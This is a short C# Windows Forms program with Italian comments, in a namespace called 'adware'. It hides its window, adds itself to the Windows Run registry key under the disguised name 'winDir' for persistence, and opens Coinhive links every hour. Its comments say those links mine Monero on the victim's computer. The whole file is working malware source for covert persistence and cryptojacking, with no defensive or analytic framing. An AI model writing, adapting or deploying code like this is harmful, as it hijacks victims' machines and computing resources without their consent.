
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

//liberire aggiunte
using Microsoft.Win32; 

namespace adware
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            //invisibile (tranne che dal task manager)
            this.Opacity = 0;
            this.ShowInTaskbar = false;

        }
        

        private void Form1_Load(object sender, EventArgs e)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", true);//path dell' autorun di windows
            
            //se non è ancora stato inserito nel'autorun ---> inseriscilo
            if (key.GetValue("winDir") == null) { key.SetValue("winDir", Application.ExecutablePath.ToString()); }        

            //creazione del timer 
            Timer timer = new Timer();                          
                timer.Interval = 3600000; // intervallo/tempo di attesa (1 ora = 3600000 ms, 1 minuto = 60000 ms)
            timer.Tick += new EventHandler(this.Tick); //azione che esegue ogni intervallo
                timer.Start(); //avvio del timer
        }

        private void Tick(object Sender, EventArgs e)
        {
            /* Coinhive: https://coinhive.com/
             * 
             * Il progrmama utilizza il computer vittima per minare Monero usando i reflink di Coinhive
             *  
             * Maggiori informazioni su Coinhive: https://coinhive.com/documentation
             */
            String[] pagine = new string[] { "https://cnhv.co/70mdp","https://cnhv.co/70mky" }; //nel caso si voglia reindirizzare la vittima su più siti web
            Random rand = new Random(); //random
            int index = rand.Next(2);//indice della pagina da aprire         
            System.Diagnostics.Process.Start(pagine[index]); //apertura pagina dal browser PREDEFINITO

        }
    }
}
